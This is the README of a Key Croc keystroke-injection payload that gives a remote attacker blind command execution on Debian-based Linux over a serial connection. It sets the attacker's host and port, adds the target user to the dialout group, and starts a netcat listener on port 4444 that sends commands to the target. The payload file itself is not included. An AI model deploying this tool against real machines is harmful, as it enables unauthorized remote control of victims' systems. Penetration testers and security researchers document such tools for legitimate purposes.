# "Linux" Blind Serial Command Injection

- Title:            "Linux" Blind Serial Command Injection
- Author:           TW-D
- Version:          1.0
- Target:           Debian-Based Linux Distributions
- Category:         Remote Access
- Attackmodes:      HID then SERIAL

## Description

Allows a remote attacker to execute commands on a Linux system via a serial connection, 
without receiving feedback on the results of the commands.

![schema](./readme_files/schema.png "schema")

__Note :__ *The target user must belong to the "dialout" group.*

```bash
target@target-computer:~$ groups
target@target-computer:~$ sudo usermod --groups dialout --append "${USER}"
```

## Configuration

From the file "lin_blind-serial-command-injection.txt" change the value of the following constants :

```

######## INITIALIZATION ########

readonly REMOTE_HOST="192.168.0.X"
readonly REMOTE_PORT="4444"
[...]

######## SETUP ########

LED SETUP

export DUCKY_LANG="us"

```

## Trigger

>
> Not applicable because of matchless payload
>

## Usage

1. Edit "config.txt" on the Key Croc in "Arming Mode" to specify the WiFi network name and 
the associated password.

2. Then place the file "lin_blind-serial-command-injection.txt" in the "payloads/" directory.

3. Eject the Key Croc safely and then start, for example, "netcat" listening on the port 
you specified in the REMOTE_PORT constant.

```bash
hacker@hacker-computer:~$ nc -lnvvp 4444
[...]
shell> echo "$(hostname)" > /tmp/output.log
[CTRL + c]
```
